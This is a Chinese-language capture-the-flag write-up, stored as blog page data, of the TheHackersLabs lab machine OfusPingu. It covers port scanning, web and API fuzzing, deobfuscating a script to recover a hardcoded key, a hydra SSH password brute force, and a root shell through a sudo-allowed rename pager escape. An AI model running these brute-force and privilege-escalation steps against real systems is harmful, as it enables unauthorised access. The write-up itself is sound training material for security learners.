{"pageProps":{"postData":{"id":"TheHackersLabsOfusPingu","contentHtml":"<h1>OfusPingu</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/102\">https://labs.thehackerslabs.com/machine/102</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsOfusPingu/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  OfusPingu nmap -sn 192.168.56.0/24                      \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:31 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00042s latency).\nMAC Address: 0A:00:27:00:00:08 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00022s latency).\nMAC Address: 08:00:27:45:5E:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.103\nHost is up (0.00040s latency).\nMAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.5\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 27.97 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  OfusPingu nmap -sT -min-rate 10000 -p- 192.168.56.103\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:34 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.103\nHost is up (0.00056s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3000/tcp open  ppp\nMAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 17.01 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  OfusPingu nmap -sT -A -p 22,80,3000 192.168.56.103    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 18:36 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.103\nHost is up (0.00056s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey: \n|   256 5c:08:d0:7c:02:65:4d:8b:95:7b:a2:89:af:ab:<span class=\"hljs-built_in\">fc</span>:9c (ECDSA)\n|_  256 af:ff:d1:1b:e2:5a:32:cb:23:47:71:2d:7a:2c:93:2e (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: Ofuscaci\\xC3\\xB3n de C\\xC3\\xB3digo JavaScript | Seguridad en APIs\n|_http-server-header: Apache/2.4.62 (Debian)\n3000/tcp open  http    Node.js Express framework\n|_http-title: Error\nMAC Address: 08:00:27:95:98:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.56 ms 192.168.56.103\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 26.49 seconds\n</code></pre>\n<h3>枚举</h3>\n<p><code>HTTP</code> 80 端口</p>\n<p><img src=\"/post-images/TheHackersLabsOfusPingu/image1.png\" alt=\"image.png\"></p>\n<p>目录扫描</p>\n<pre><code class=\"hljs language-bash\">➜  OfusPingu feroxbuster --url http://192.168.56.103 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400 -x js,txt,zip,php\n  \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben <span class=\"hljs-string\">\"epi\"</span> Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.56.103\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ <span class=\"hljs-literal\">true</span>\n 💲  Extensions            │ [js, txt, zip, php]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET        1l       23w     1492c http://192.168.56.103/script.js\n200      GET      422l     1343w    17244c http://192.168.56.103/\n[####################] - 2m   1102740/1102740 0s      found:2       errors:965    \n[####################] - 2m   1102725/1102725 8759/s  http://192.168.56.103/\n</code></pre>\n<p><code>script.js</code> 很明显就是被混淆过了</p>\n<p><img src=\"/post-images/TheHackersLabsOfusPingu/image2.png\" alt=\"image.png\"></p>\n<p>通过 <code>AI</code> 进行恢复</p>\n<pre><code class=\"hljs language-bash\">// =======================================================\n//               【还原后的可读代码】\n// =======================================================\n\n// 函数：初始化应用程序\n<span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">inicializarAplicacion</span></span>() {\n    // 这个 <span class=\"hljs-string\">'configParts'</span> 变量在这段代码中并未定义，\n    // 它很可能是在此脚本加载之前的某个地方定义的全局变量。\n    // 假设 configParts = [<span class=\"hljs-string\">'QWERTY'</span>, <span class=\"hljs-string\">'CHOCOLATITO'</span>, <span class=\"hljs-string\">'CHOCOLATON'</span>, <span class=\"hljs-string\">'CHINGON'</span>]\n    const API_KEY_SECRETA = configParts.map(f => f.toLowerCase()).<span class=\"hljs-built_in\">join</span>(<span class=\"hljs-string\">''</span>); \n    // 结果会是 <span class=\"hljs-string\">'qwertychocolatitocholatonchingon'</span>\n\n    // 应用的配置对象\n    const appConfig = {\n        version: <span class=\"hljs-string\">'1.0.3'</span>,\n        entorno: <span class=\"hljs-string\">'produccion'</span>, // 环境：生产\n        apiEndpoint: <span class=\"hljs-string\">'https://adivinaadivinanza/v3'</span>, // API 地址\n        credenciales: {\n            usuario: <span class=\"hljs-string\">'jeje'</span>,\n            // 通过一系列字符串操作生成访问凭证\n            acceso: API_KEY_SECRETA.<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">''</span>).reverse().<span class=\"hljs-built_in\">join</span>(<span class=\"hljs-string\">''</span>) + <span class=\"hljs-string\">'123'</span>.<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">''</span>).reverse().<span class=\"hljs-built_in\">join</span>(<span class=\"hljs-string\">''</span>)\n            // <span class=\"hljs-string\">'qwertychocolatitocholatonchingon'</span> -> 反转 -> <span class=\"hljs-string\">'nognihcnotalocotihtalocohcytrewq'</span>\n            // <span class=\"hljs-string\">'123'</span> -> 反转 -> <span class=\"hljs-string\">'321'</span>\n            // 最终的 acceso 是 <span class=\"hljs-string\">'nognihcnotalocotihtalocohcytrewq321'</span>\n        },\n        features: {\n            darkMode: <span class=\"hljs-literal\">true</span>,\n            analytics: <span class=\"hljs-literal\">false</span>\n        }\n    };\n\n    // 函数：连接API\n    const conectarAPI = () => {\n        // 对 <span class=\"hljs-string\">'acceso'</span> 凭证再次进行处理，生成最终的密钥\n        const claveFinal = appConfig.credenciales.acceso.slice(0, -3).<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">''</span>).reverse().<span class=\"hljs-built_in\">join</span>(<span class=\"hljs-string\">''</span>);\n        // 1. 去掉最后3个字符 (<span class=\"hljs-string\">'321'</span>) -> <span class=\"hljs-string\">'nognihcnotalocotihtalocohcytrewq'</span>\n        // 2. 再次反转 -> <span class=\"hljs-string\">'qwertychocolatitocholatonchingon'</span> (恢复原样)\n\n        console.log(<span class=\"hljs-string\">'Conectando la API con clave:'</span>, claveFinal); // <span class=\"hljs-string\">\"连接 API，使用密钥: qwertychocolatitocholatonchingon\"</span>\n        \n        // 返回一个模拟的API连接成功对象\n        <span class=\"hljs-built_in\">return</span> {\n            status: 200,\n            message: <span class=\"hljs-string\">'Conexión exitosa'</span>, // <span class=\"hljs-string\">\"连接成功\"</span>\n            // 将 <span class=\"hljs-string\">'密钥:admin'</span> 进行 Base64 编码作为 token\n            token: btoa(claveFinal + <span class=\"hljs-string\">':'</span> + <span class=\"hljs-string\">'admin'</span>) \n        };\n    };\n\n    // **关键逻辑**：只有当网页的域名是 <span class=\"hljs-string\">'secretazosecreton'</span> 时，才执行连接API的操作\n    <span class=\"hljs-keyword\">if</span> (window.location.hostname === <span class=\"hljs-string\">'secretazosecreton'</span>) {\n        // 3秒后执行\n        setTimeout(() => {\n            const m = conectarAPI();\n            console.log('Resultado conexión:', m); // \"连接结果: ...\"\n        }, <span class=\"hljs-number\">3000</span>);\n    }\n}\n\n// 当整个页面的HTML加载和解析完成后，执行以下代码\ndocument.addEventListener('DOMContentLoaded', () => {\n    // <span class=\"hljs-number\">1</span>. 初始化应用\n    inicializarAplicacion();\n    \n    // <span class=\"hljs-number\">2</span>. 给页面上所有的 &#x3C;button> 元素添加点击事件监听\n    const buttons = document.querySelectorAll('button');\n    buttons.forEach(btn => {\n        btn.addEventListener('click', () => {\n            console.log('Botón clickeado'); // \"按钮被点击了\"\n        });\n    });\n});\n\n// 函数：验证密钥\nfunction validarClave(a) {\n    const claveReal = 'QWERTYCHOCOLATITOCHOCOLATONCHINGON';\n    return a === claveReal;\n}\n\n// 这是一个模块导出语句，常见于 Node.js 环境。\n// 意思是如果这个JS文件在支持模块化的环境（如Node.js）中被引用，\n// 它会导出一个包含 validarClave 函数的对象。\nif (typeof module !== 'undefined' &#x26;&#x26; module.exports) {\n    module.exports = {\n        validarClave\n    };\n}\n</code></pre>\n<p>得到一些信息，例如秘钥：<code>QWERTYCHOCOLATITOCHOCOLATONCHINGON</code></p>\n<p>接下来到 <code>3000</code>端口</p>\n<p><img src=\"/post-images/TheHackersLabsOfusPingu/image3.png\" alt=\"image.png\"></p>\n<p>对 <code>3000</code> 端口进行 <code>fuzz</code></p>\n<pre><code class=\"hljs language-bash\">➜  OfusPingu wfuzz -u <span class=\"hljs-string\">'http://192.168.56.103:3000/FUZZ'</span> -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt --hc 404\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class=\"hljs-string\">'s documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.56.103:3000/FUZZ\nTotal requests: 74332\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                        \n=====================================================================\n\n000000823:   400        0 L      2 W        33 Ch       \"api\"                                                                                                                          \n000016154:   301        10 L     15 W       156 Ch      \"public\"                                                                                                                       \n000016155:   301        10 L     15 W       156 Ch      \"Public\"                                                                                                                       \n000022384:   400        0 L      2 W        21 Ch       \"view\"                                                                                                                         \n\nTotal time: 88.55361\nProcessed Requests: 74332\nFiltered Requests: 74328\nRequests/sec.: 839.4010\n</span></code></pre>\n<p><code>api</code> 直接访问提示</p>\n<pre><code class=\"hljs language-bash\">{<span class=\"hljs-string\">\"error\"</span>:<span class=\"hljs-string\">\"Parámetro incorrecto.\"</span>}\n</code></pre>\n<p><code>view</code> 直接访问提示</p>\n<pre><code class=\"hljs language-bash\">Parámetro incorrecto.\n</code></pre>\n<p>在对其进行枚举，使用上边的秘钥作为参数</p>\n<pre><code class=\"hljs language-bash\">➜  OfusPingu wfuzz -u <span class=\"hljs-string\">'http://192.168.56.103:3000/api/?FUZZ=QWERTYCHOCOLATITOCHOCOLATONCHINGON'</span> -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt --hc=404,400\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class=\"hljs-string\">'s documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.56.103:3000/api/?FUZZ=QWERTYCHOCOLATITOCHOCOLATONCHINGON\nTotal requests: 74332\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                        \n=====================================================================\n\n000020620:   200        0 L      1 W        30 Ch       \"token\"  \n</span></code></pre>\n<p>枚举出来 <code>token</code></p>\n<pre><code class=\"hljs language-bash\">➜  OfusPingu curl http://192.168.56.103:3000/api/\\?token\\=QWERTYCHOCOLATITOCHOCOLATONCHINGON                                                                     \n{<span class=\"hljs-string\">\"key\"</span>:<span class=\"hljs-string\">\"MI-KEY-SECRETA-12345\"</span>}# \n</code></pre>\n<p>得到一个 <code>key</code></p>\n<p>我们再测试 <code>view</code></p>\n<pre><code class=\"hljs language-bash\">➜  OfusPingu curl http://192.168.56.103:3000/view/\\?token\\=QWERTYCHOCOLATITOCHOCOLATONCHINGON\nParámetro incorrecto.#\n\n➜  OfusPingu curl http://192.168.56.103:3000/view/\\?token\\=MI-KEY-SECRETA-12345\nParámetro incorrecto.#\n\n➜  OfusPingu curl http://192.168.56.103:3000/view/\\?key\\=<span class=\"hljs-string\">'MI-KEY-SECRETA-12345'</span>                  \n&#x3C;!DOCTYPE html>        \n&#x3C;html lang=<span class=\"hljs-string\">\"es\"</span>>                                                                                \n&#x3C;<span class=\"hljs-built_in\">head</span>>                                                                                          \n  &#x3C;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>>                        \n  &#x3C;title>Zona Secreta&#x3C;/title\n  ...\n</code></pre>\n<p>告诉我们可以使用密码和 <code>debian</code> 进行 <code>ssh</code> 登录</p>\n<p><img src=\"/post-images/TheHackersLabsOfusPingu/image4.png\" alt=\"image.png\"></p>\n<p>使用 <code>hydra</code> 进行爆破</p>\n<pre><code class=\"hljs language-bash\">➜  OfusPingu hydra -l debian -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.103 ssh                                                                                                       \nHydra v9.5 (c) 2023 by van Hauser/THC &#x26; David Maciejak - Please <span class=\"hljs-keyword\">do</span> not use <span class=\"hljs-keyword\">in</span> military or secret service organizations, or <span class=\"hljs-keyword\">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-05 19:53:26\n[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task\n[DATA] attacking ssh://192.168.56.103:22/\n[22][ssh] host: 192.168.56.103   login: debian   password: chocolate\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-05 19:53:41\n</code></pre>\n<p>进入后能读到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">debian@OfusPingu:~$ <span class=\"hljs-built_in\">cat</span> flag.txt \n457xxxxxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>权限提升</h2>\n<p><code>.bash_history</code> 没删掉，但是内容貌似没有很有用</p>\n<pre><code class=\"hljs language-bash\">debian@OfusPingu:~$ <span class=\"hljs-built_in\">ls</span> -la\ntotal 36\ndrwx------ 4 debian debian 4096 Jun  7 12:09 .\ndrwxr-xr-x 3 root   root   4096 Jun  7 10:52 ..\n-rw------- 1 debian debian  387 Jun  7 12:16 .bash_history\n-rw-r--r-- 1 debian debian  220 Jun  7 10:52 .bash_logout\n-rw-r--r-- 1 debian debian 3526 Jun  7 10:52 .bashrc\n-rw-r--r-- 1 root   root     33 Jun  7 12:09 flag.txt\ndrwxr-xr-x 3 debian debian 4096 Jun  7 12:05 .<span class=\"hljs-built_in\">local</span>\ndrwxr-xr-x 4 root   root   4096 Jun  7 17:03 mi-web\n-rw-r--r-- 1 debian debian  807 Jun  7 10:52 .profile\n\ndebian@OfusPingu:~$ <span class=\"hljs-built_in\">cat</span> .bash_history \n<span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">sudo</span> /usr/bin/rename\n<span class=\"hljs-built_in\">sudo</span> /usr/bin/rename -h\n<span class=\"hljs-built_in\">sudo</span> /usr/bin/rename -m\n<span class=\"hljs-built_in\">exit</span>\n<span class=\"hljs-built_in\">ls</span>\n<span class=\"hljs-built_in\">cd</span> mi-web/\n<span class=\"hljs-built_in\">ls</span>\n<span class=\"hljs-built_in\">pwd</span>\n<span class=\"hljs-built_in\">sudo</span> su\n<span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">sudo</span> /usr/bin/rename\n<span class=\"hljs-built_in\">sudo</span> /usr/bin/rename -m\ngrub-mkpasswd-pbkdf2\n<span class=\"hljs-built_in\">touch</span> /etc/grub.d/01_password &#x26;&#x26; <span class=\"hljs-built_in\">chmod</span> a+x /etc/grub.d/01_password\nnano /etc/grub.d/01_password\n<span class=\"hljs-built_in\">sudo</span> nano /etc/grub.d/01_password\n<span class=\"hljs-built_in\">sudo</span> su\n<span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">sudo</span> /usr/bin/rename -m\n<span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">sudo</span> /usr/bin/rename -m\n</code></pre>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">debian@OfusPingu:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> debian on OfusPingu:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser debian may run the following commands on OfusPingu:\n    (ALL) NOPASSWD: /usr/bin/rename\n</code></pre>\n<p>结束了，跟着<code>.bash_history</code> 敲 <code>sudo /usr/bin/rename -m</code> 会进入帮助</p>\n<p><img src=\"/post-images/TheHackersLabsOfusPingu/image5.png\" alt=\"image.png\"></p>\n<p>然后可以输入<code>esc</code> + <code>!/bin/bash</code> 即可切换到 <code>root shell</code> ，这里类似于使用 <code>less</code> 或者 <code>more</code>等来提权</p>\n<p><img src=\"/post-images/TheHackersLabsOfusPingu/image6.png\" alt=\"image.png\"></p>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@OfusPingu:~# <span class=\"hljs-built_in\">cat</span> root.txt \nD99xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>","title":"TheHackersLabs - OfusPingu","date":"2025-08-05","updated":"2025-08-05","tags":["TheHackersLabs","linux","API","rename","hydra"],"categories":"靶机","comments":true,"description":"OfusPingu\n\n https://labs.thehackerslabs.com/machine/102\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n\n\n枚举\n\n`HTTP` 80 端口\n\n\n\n目录扫描\n\n\n\n`script.js` 很明显就是被混淆过了\n\n\n\n通过 `AI` 进行恢复\n\n\n\n得到一些信息，例如秘钥：`QWERTYCHOCOLATITOCHOCOLATONCHINGO..."},"recentPosts":[{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"},{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"}]},"__N_SSG":true}